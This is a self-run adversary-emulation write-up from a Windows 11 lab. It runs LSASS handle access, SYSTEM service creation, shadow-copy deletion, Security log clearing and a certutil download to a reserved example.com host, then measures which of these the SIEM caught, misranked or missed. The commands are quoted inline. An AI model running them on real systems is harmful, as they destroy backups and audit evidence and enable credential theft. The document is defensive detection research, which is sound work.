# 005 — Four privileged techniques, and the queue that ranked them last

**Date:** 2026-09-17
**Type:** self-run adversary emulation on `WIN11-VICTIMA`, from an elevated interactive session
**Scope:** the phase that needs administrator — the half investigation 004 could not reach
**ATT&CK:** T1003.001, T1543.003, T1490, T1685.005, T1105 (re-measured)

## 0. Why this one needed a different way in

Investigation 004 ran ten techniques as a standard user and ended with a list of things it
could not do. Everything interesting after a foothold — reading credentials out of LSASS,
installing a service, deleting the backups, clearing the log behind you — needs administrator,
and this lab's normal way of driving the endpoint cannot get it. `VBoxManage guestcontrol`
hands out a UAC-filtered token: the lab account is in `Administrators`, and `whoami /groups`
shows that membership as *"Group used for deny only"* at Medium integrity. Anything that checks
for privilege bounces.

So this phase was driven the slow way, and it is worth a paragraph because it is the part a
reader can least easily reproduce from a command list. The VM was started with a graphical
console, the lock screen dismissed and the account logged in by injecting raw keyboard
scancodes, `Windows PowerShell` launched from the Start menu search with `Ctrl+Shift+Enter`
(run as administrator), and the UAC prompt accepted with `Alt+Y` — never `Enter`, because the
default button on that dialog is **No**. The UAC prompt is invisible to a screenshot while it
sits on the secure desktop, so the way to confirm it is waiting is to look for a running
`consent.exe`. From there every script was copied in with `guestcontrol` and merely *invoked*
by keystroke, writing its output to a file that was pulled back afterwards — so the evidence is
text rather than pixels.

The result, and the precondition for everything below: `High Mandatory Level`, and
`BUILTIN\Administrators ... Enabled group, Group owner`. A real elevated token.

## 1. What was run

Four techniques, plus one configuration fix and one re-measurement, each watermarked by taking
the last `RecordId` of every channel immediately before it ran, so its telemetry could be
isolated without cross-contamination. Every command line carried the marker `SIMFASE2`, and any
network destination was under `.example.com`, which RFC 2606 reserves and which therefore does
not resolve.

| # | Technique | ATT&CK | What it did |
|---|---|---|---|
| 1 | LSASS memory access | T1003.001 | `OpenProcess(0x1410)` on `lsass.exe`. **No credentials were dumped** — the handle is what generates the event, and dumping adds risk without adding detection |
| 2 | Service creation | T1543.003 | `sc.exe create` registering `cmd.exe` as a `LocalSystem` service, then starting it |
| 3 | Shadow copy deletion | T1490 | A real shadow copy created, verified, then `vssadmin delete shadows /all /quiet`. Authorised explicitly for this phase |
| 4 | Security log clear | T1685.005 | `wevtutil cl Security`, run **last**, because it destroys the local evidence of steps 1–3 |
| — | Defender channel ingestion | — | The §6.1 remediation from investigation 004, applied and then measured |
| — | `certutil` re-run | T1105 | The same command line Defender signatured in the unprivileged phase, repeated to test whether its verdict now reaches the SIEM |

Order matters here. The log clear went last on purpose, and the Defender fix went early so that
everything after it would benefit.

## 2. What the endpoint stopped

Two of the four techniques never completed, and both failures are more interesting than the
successes.

**LSASS was protected by design.** `RunAsPPL=2` is set on this build — Windows 11 enables LSA
protection by default on clean installs — so `lsass.exe` runs as a protected process and the
handle request was **denied with Win32 error 5, *Access is denied***, from a fully elevated
session. Not "denied because the script was wrong": denied because being an administrator is no
longer sufficient to read LSASS on a modern, default-configured Windows endpoint. Mimikatz's
classic path is closed here without anyone having configured anything.

**`certutil.exe` was blocked before it executed.** Not detected afterwards — the process failed
to start at all, with *"Program 'certutil.exe' failed to run: Access is denied"*. Defender then
wrote `1116` ×2 and `1117` ×1, naming `Trojan:Win32/Ceprolad.A`, *Severity: **Severe***, and the
`Path` field of those events reads
`CmdLine:_C:\Windows\System32\certutil.exe -urlcache -split -f https://SIMFASE2.example.com/...`.
That confirms, for the second time in this lab, that **Defender matched the command line and not
a payload**: nothing was ever downloaded, the domain does not resolve, and the signature is on
the invocation.

The two that did complete, completed fully. The service was registered as `LocalSystem` and — a
detail worth stopping on — **its `binPath` executed even though the Service Control Manager
returned error 1053** (*"did not respond to the start or control request in a timely
fashion"*). `cmd.exe` does not speak the service control protocol, so the SCM gave up on it;
the code ran anyway, and wrote its witness file. That *is* the PsExec mechanism. An analyst who
reads a 1053 as "the attacker's service failed" has misread it: failing the service protocol
does not prevent code running as SYSTEM.

And T1490 destroyed something real, not a simulation. A shadow copy was created via
`Win32_ShadowCopy`, confirmed present with `vssadmin list shadows`, then deleted: exit code 0,
count **1 → 0**.

## 3. The detection that was switched off

The single most valuable finding of this run started as a non-result. The LSASS handle was
denied, and **Sysmon Event ID 10 was not written**. The obvious conclusion — "the kernel denied
it before Sysmon could see it" — would have been wrong, and it would have led to the wrong
remediation, so it got two controls.

| Control | Access requested | Target | Handle | Sysmon EID 10 |
|---|---|---|---|---|
| 1 | `0x1000` (`QUERY_LIMITED_INFORMATION`, which PPL permits) | `lsass.exe` | **granted** | **0** |
| 2 | `0x1410` | a non-protected process | **granted** | **0** |

Both handles were granted and Sysmon logged nothing either time. So the silence is not about
LSASS and not about the denial. Reading the active configuration settled it. The deployed config
is **SwiftOnSecurity `sysmon-config` version 74, dated 2021-07-08**, and its ProcessAccess
section reads, verbatim:

```xml
<!--SYSMON EVENT ID 10 : INTER-PROCESS ACCESS [ProcessAccess]-->
    <!--COMMENT:	Can cause high system load, disabled by default.-->
<RuleGroup name="" groupRelation="or">
    <ProcessAccess onmatch="include">
        <!--NOTE: Using "include" with no rules means nothing in this section will be logged-->
    </ProcessAccess>
</RuleGroup>
```

An `include` block with no rules inside it matches nothing. Event ID 10 is not filtered on this
endpoint — it is **switched off**, deliberately, upstream, for performance, and documented as
such in the file. The whole history of the channel agrees: **14,445 Sysmon events on this
endpoint, of which 0 are Event ID 10.**

| Sysmon EID | 1 | 2 | 3 | 4 | 5 | 8 | **10** | 11 | 12 | 13 | 16 | 22 | 255 |
|---|--:|--:|--:|--:|--:|--:|--:|--:|--:|--:|--:|--:|--:|
| Count | 3182 | 1284 | 131 | 10 | 32 | 13 | **0** | 7377 | 157 | 2100 | 2 | 138 | 19 |

This is the failure mode worth carrying into an interview. A SOC can hold a correct, well-written
credential-dumping rule; deploy the most widely recommended Sysmon config in the industry; see no
LSASS alerts for a year; and conclude it is not being targeted. The rule never had an event to
read. Nobody made a mistake — someone made a reasonable performance tradeoff in 2021 and nobody
re-measured it since. *"We have a rule for that"* and *"we would see it"* are different claims,
and only the second one matters.

The honest limit: because PPL denies the handle on this host, I could not measure whether a
**denied** request produces an Event ID 10 with a low `GrantedAccess` once ProcessAccess is
instrumented. That is the question that decides whether a hardened endpoint is also a quieter
one, and it is unanswered here.

## 4. What reached the analyst

Over the phase window (18:50–19:30 UTC) the SIEM indexed **1,066 alerts**.

| Channel | Alerts | Top event IDs |
|---|--:|---|
| Security | 869 | 4688 ×568, 4624 ×120, 4634 ×120, 4672 ×60, **1102 ×1** |
| Sysmon | 153 | 11 ×113, 1 ×39, 13 ×1 |
| PowerShell | 16 | 4104 ×16 |
| Application | 12 | 1001 ×5, and eight others once each |
| **Defender** | **9** | 2010 ×6, **1116 ×2**, **1117 ×1** |
| System | 7 | 7040 ×3, **7045 ×1**, 7000, 7009, 10010 |

Technique by technique, what an analyst would actually have in front of them:

| Technique | Endpoint telemetry | Alert | Level |
|---|---|---|---|
| T1003.001 LSASS | **none** (EID 10 not instrumented) | **none** | — |
| T1543.003 service | 4697 **and** 7045 | 7045 → rule `61138` | 5 |
| T1543.003, via 4697 | 4697 generated (RecordId 68401) | **none** | — |
| T1490 shadow copies | 4688 + Sysmon 1, full command line | rule `67027`, *"a process was created"* | **3** |
| T1685.005 log clear | 1102 (RecordId 68663) | rule `63103`, *"The audit log was cleared"* | 5 |
| T1105 / Defender | 1116 ×2, 1117 | rules `62123`, `62124` | **12**, 3 |

Three things in that table deserve naming.

**The 4697 produced nothing, again.** This lab first measured that on 2026-08-08: Security 4697
exists in the endpoint log, sits on a channel the agent forwards, and matches no rule in the
stock ruleset. Second measurement, same result. The service installation was still caught —
through **7045** on the System channel — which means detection of a very common lateral-movement
technique rests on one of its two available sources, and the one it rests on is the one that
carries less. 7045 has the image path and start type; 4697 additionally carries
`SubjectUserName` and `SubjectLogonId`, which is the field that turns *"a service appeared"* into
*"this session installed it"*. As with the 4697 finding in 004, "0 documents" cannot by itself
separate *"the event reached the manager and nothing matched"* from *"it never arrived"* —
Wazuh indexes only what matched a rule.

**T1490 is not invisible; it is camouflaged.** `vssadmin delete shadows /all /quiet` reached the
SIEM with its full command line intact, and matched only the catch-all that fires on every
process creation, at level 3, alongside **567 others in the same window**. The System channel
contributed nothing at all: no VSS event, no volsnap event. The subsystem that lost the data
does not report its own loss. The same level-3 row that says "a service host started" is the row
that says "every restore point on this machine is gone".

**The log clear worked, and so did log forwarding.** `wevtutil cl Security` destroyed **64,670
records and 58.07 MB** of audit history, leaving 9 records behind. Everything steps 1–3 had
generated locally was gone. But the `vssadmin` 4688 is still queryable in the SIEM, because it
had already left the machine. That is the entire argument for log forwarding, demonstrated in
one command rather than asserted.

One measured detail contradicts the assumption I started with, and it is useful. I expected the
record counter to reset. It does not: after the clear the log held **9** records while the 1102
itself carried `RecordId` **68663**, continuing from 68660. A log whose newest RecordId vastly
exceeds its RecordCount has been cleared — and unlike the 1102, that asymmetry is a property of
the log file rather than an entry an attacker can go back and target.

## 5. The severity inversion

Sorted by severity, the phase looks like this:

| Rule | Level | Count | What it is |
|---|--:|--:|---|
| **92213** | **15** | **39** | `__PSScriptPolicyTest_*.ps1` — **false positive** |
| **91823** | **14** | **2** | *"Invoke-command … on remote host"* — **false positive** |
| 62123 | 12 | 2 | Defender detected a Severe trojan — real, and new |
| 92205 | 9 | 10 | — |
| 92219 | 6 | 50 | — |
| 63103 | **5** | 1 | **64,670 audit records destroyed** |
| 61138 | **5** | 1 | **A service installed as SYSTEM** |
| 67027 | **3** | 568 | includes **every restore point deleted** |

The two most severe alerts of an entire privileged-attacker phase are both false positives, and
between them they account for 41 rows. `92213` is the same `__PSScriptPolicyTest` false positive
this lab has now watched fire on five separate dates — 1, 5, 12, 3 and now **39** times, **60
total, every one of them false**. It fires on a temp file that signed system PowerShell writes to
test its own execution policy.

`91823` is new here and worth a look, because it is a more interesting kind of wrong. It fired on
a PowerShell `4104` script block whose text defines functions called `Test-Caller` and
`Invoke-Expression` — defensive plumbing from Windows itself, not from my attack. The rule
matched a keyword in code that exists to *prevent* the thing the rule is named after, and scored
it 14.

Meanwhile: destroying the audit trail is a 5. Installing a SYSTEM service is a 5. Deleting every
shadow copy is a 3, indistinguishable from `svchost` starting. Credential access against LSASS is
nothing at all.

An analyst triaging this queue top-down by severity — which is what a level field is *for* —
works through 41 false positives before reaching the first genuinely privileged action, and never
reaches T1490 or T1003.001 by that route at all. This is not a missing-rule problem. Three of the
four techniques matched a rule. It is that **severity, as shipped, encodes how alarming an event
sounds rather than how much authority it required or how much damage it did.**

## 6. Closing investigation 004's headline finding

Investigation 004's headline was that Defender detected and removed two `Severe` trojans and the
SIEM recorded nothing, because `Microsoft-Windows-Windows Defender/Operational` was absent from
the agent's `ossec.conf`. That fix needs administrator, so it belonged to this phase. Applied:

```xml
<localfile>
  <location>Microsoft-Windows-Windows Defender/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

Six forwarded channels became seven, the XML still parsed, `WazuhSvc` restarted and came back
`connected`, and the agent's own log confirmed it had picked the channel up:

```
wazuh-agent: INFO: (1951): Analyzing event log: 'Microsoft-Windows-Windows Defender/Operational'.
```

Then the measurement, which is the part that matters. Re-running the `certutil` line produced the
same detection as in the unprivileged phase — and this time a query of the whole alert index for that channel
returns **exactly 3 documents**: `1116` ×2 at **level 12** (rule `62123`) and `1117` ×1 at level 3
(rule `62124`). That the total is 3, and not 3-plus-history, is the cleanest possible evidence
that the channel had **never produced a single document before** in this lab's existence.

The finding has moved from *"the SIEM is deaf to its own antivirus"* to *"it was, here is the
level-12 alert that did not exist yesterday"*. One edit, no rule authoring, and the endpoint's
most authoritative verdict now reaches the console.

It also exposed the next asymmetry, and I am flagging it rather than fixing it: **`1116`
*detected* is level 12, while `1117` *remediated* is level 3.** The event that means "malware was
on this machine and I removed it" is scored as routine. As 004 argued, a remediation event is not
the end of an incident — it is the start of one, because something put that malware there and
whatever did is probably still running.

A smaller loose end from 004 also closed. That writeup reported three unexplained Sysmon Event ID
8 (`CreateRemoteThread`) events and logged them as an open thread. Three appeared again here, and
this time with context: all three have `SourceImage: powershell.exe`, `TargetImage: <unknown
process>`, an **identical `StartAddress`**, and timestamps in the same milliseconds as the
Defender `1116` records. They are an artefact of launching a process that Defender aborts, not
injection into a live process. Correlation rather than proof of the internal mechanism, but
enough to take it off the open list.

## 7. What this means if it were real

Strip the lab framing. An intruder who has escalated on a workstation does four things: reads
credentials to move sideways, installs a service for persistence and SYSTEM execution, deletes
the backups so recovery is expensive, and clears the log so reconstruction is hard.

On this endpoint, two of those were stopped by controls nobody in this lab configured — LSA
protection and Defender's command-line signatures. That is real defence in depth and it should be
said plainly, because the interesting question is what is left after it.

What is left is this: the attacker still installed a SYSTEM service, still destroyed every
restore point, and still burned 58 MB of audit history — and the SOC's queue presented those
three facts at levels 5, 3 and 5, underneath 41 false positives at 14 and 15. The most likely
outcome is not that the SOC investigates and fails. It is that the shift ends, the two loud
false positives get closed as known noise, the level-3 and level-5 rows are never opened, and the
first anyone hears of it is when the ransomware note appears and the backups turn out to be gone.

And the LSASS attempt — the one moment a defender would most want to know about, because it is
unambiguous and has no benign explanation — left **no trace of any kind**. The mitigation
protected the credentials. It did not tell anyone the attempt happened. Prevention without
visibility means the machine is safer and the SOC is blinder, and only one half of that was a
decision anyone made on purpose.

## 8. How to counter it

Ordered cheapest and highest-impact first. Each item names the threat, then the counter.

**8.1 — Fill in Sysmon's `ProcessAccess` block. (Configuration, not detection.)**
*Threat:* credential dumping from LSASS is the single most reliable pivot from one compromised
workstation to a domain, and on this endpoint it is entirely unobservable.
*Counter:* an `include` rule on `TargetImage` ending in `\lsass.exe`, with `SourceImage`
exclusions for the agents that legitimately read it. The upstream "high system load" warning is
real, which is exactly why the exclusions come first and the scope stays narrow — this is not a
reason to leave the block empty, it is a reason to fill it carefully. Nothing else on this page
costs so little and changes so much: without it the rule in 8.2 is decoration.
Rule: [`proc_access_win_lsass_memory_read.yml`](../detections/sigma/proc_access_win_lsass_memory_read.yml).

**8.2 — Detect LSASS memory access.** *Threat:* as above, plus the hardened-host case where the
handle is denied and the attacker simply tries another technique.
*Counter:* alert on memory-read `GrantedAccess` values against `lsass.exe`, triaging on
`CallTrace` — a call trace made only of signed Windows modules is a different proposition from
one routed through unbacked memory. Inert until 8.1 is done, and labelled that way in the rule.

**8.3 — Re-score the events that imply authority.** *Threat:* the severity inversion in §5 is not
a cosmetic complaint; it is the mechanism by which a real intrusion goes unopened.
*Counter:* three specific changes, all of them re-scoring rather than new logic. Raise `63103`
(audit log cleared) — there is no benign routine reason for it on a workstation. Raise `61138`
(service installed) and deploy the 4697 companion rule, so the account that installed it is
visible. And raise `62124` (Defender *remediated*) to at least the level of `62123`, because
"malware was here" deserves a human more than "something looked suspicious" does.
Rules: [`win_security_audit_log_cleared.yml`](../detections/sigma/win_security_audit_log_cleared.yml),
[`win_security_susp_service_installation.yml`](../detections/sigma/win_security_susp_service_installation.yml).

**8.4 — Detect recovery destruction on its own terms.** *Threat:* T1490 is the last quiet moment
before ransomware, its standard mitigation **M1018 cannot help** — deleting shadow copies
requires administrator and the attacker already is one — so the entire residual risk is
detection, and right now it is a level-3 row.
*Counter:* a rule keyed on the command lines that destroy recovery capability (`vssadmin`,
`wbadmin`, `bcdedit`, `Win32_ShadowCopy`), triaged by parent process, since a backup product on
its schedule and an interactive shell issue identical commands. Two limits stated up front: the
COM/WMI API path spawns no process and is not covered, and `wmic.exe` no longer exists on this
build, so a rule written only against `wmic shadowcopy delete` would cover nothing here.
Rule: [`proc_creation_win_shadow_copy_deletion.yml`](../detections/sigma/proc_creation_win_shadow_copy_deletion.yml).

**8.5 — Tune 92213, now with 60 firings of evidence.** *Threat:* none. That is the point: an
untuned level-15 rule that has fired 60 times and been wrong 60 times teaches analysts that the
top of the queue is noise, which is precisely the habit that buries a real level-5.
*Counter:* deploy the exclusion that is already written
([`file_event_win_executable_dropped_excluding_psscriptpolicytest.yml`](../detections/sigma/file_event_win_executable_dropped_excluding_psscriptpolicytest.yml)),
and add `91823` to the same queue — its match on Windows' own defensive script text is the same
class of defect.

**8.6 — Watch for the cleared-log asymmetry, not just the 1102.** *Threat:* an attacker who can
suppress or outpace the 1102.
*Counter:* the discontinuity in §4 — newest `RecordId` far exceeding `RecordCount` — is evidence
of a clear that lives in the log file's own structure rather than in a record an attacker can
target. Cheap to check during triage, and it does not depend on the event surviving.

## 9. Honest limits

- **This phase measured two controls at once.** Defender and LSA protection were both left on, on
  purpose, because that is what a real endpoint looks like. It means *"the attack was stopped"*
  and *"the SIEM detected the attack"* are separate statements throughout, and I have kept them
  separate.
- **The 4697 result is bounded the same way as in 004.** "0 documents in `wazuh-alerts-*`" cannot
  distinguish a collection failure from a detection failure, because the manager indexes only
  what matched a rule. Archives logging would settle it and is not enabled.
- **Whether a denied LSASS handle logs is unmeasured**, as described in §3, and it is the case
  that matters most on a hardened host.
- **Control 2 in §3 used a `notepad.exe` whose PID came from `Start-Process -PassThru`.** On
  Windows 11 Notepad is a Store app, so the process that owns the window is not necessarily the
  one that PID refers to. The handle was granted against a live PID, so the control stands, but
  it is a weaker control than control 1.
- **The Sysmon Event ID 8 explanation is a correlation, not a mechanism.** Identical
  `StartAddress`, `SourceImage` and millisecond-level timing with the Defender events are strong
  circumstantial evidence; I did not trace the call.
- **Instrumental noise is in the numbers.** The 120 × 4624 and 120 × 4634 in §4 are mostly my own
  `guestcontrol` calls, each of which performs a logon, not attacker activity. There is also one
  genuine `4625` early in the window: mine, from sending `Enter` to the login screen with an
  empty password field. Naming it beats letting a reader discover an unexplained failed logon
  later.
- **One operator error, recorded because the lab is the artefact.** The `notepad.exe` from control
  2 did not close when the script terminated its PID, took keyboard focus, and the next command I
  typed went into an open text document instead of the terminal. Nothing was saved and the edit
  was undone, but the fix was procedural rather than lucky: every subsequent command wrote a
  witness file first and only ran if that file appeared. Typing blind into a machine you are
  investigating is how evidence gets contaminated.

## 10. ATT&CK coverage from this run

| Technique | Ran | A control stopped it | Telemetry generated | SIEM alerted | Score |
|---|---|---|---|---|:--:|
| T1003.001 LSASS memory | attempted | **yes** (LSA protection, `RunAsPPL=2`) | **none** — EID 10 not instrumented | **no** | 1 |
| T1543.003 service creation | **yes** (code ran as SYSTEM) | no | 4697 + 7045 | 7045 only, level 5 | 3 |
| T1490 shadow copy deletion | **yes** (1 → 0) | no | 4688 + Sysmon 1 | catch-all only, level 3 | 2 |
| T1685.005 clear Security log | **yes** (64,670 records) | no | 1102 | yes, level 5 | 3 |
| T1105 `certutil` transfer | blocked at launch | **yes** (Defender, command line) | 1116 ×2, 1117 | **yes, level 12** | 3 |

Two of those scores changed today, and neither changed because a rule was written: T1105 moved
from 1 to 3 by forwarding a log channel, and T1685.005 from 0 to 3 by finally running the
technique against a rule that had been sitting there at level 5 the whole time. The lab's own
strict counter — simulated by me *and* detected by a rule — goes from 3 to 5, against a target of
10.

The count of techniques detected by a rule **I wrote** is still **0**. Eighteen files and
twenty-eight rule documents are drafted, all of them pass `sigma check`, and not one is deployed
to the manager. Until that changes, every rule referenced in §8 is a hypothesis with a measurement
attached, and this repository keeps calling it `drafted` for exactly that reason.
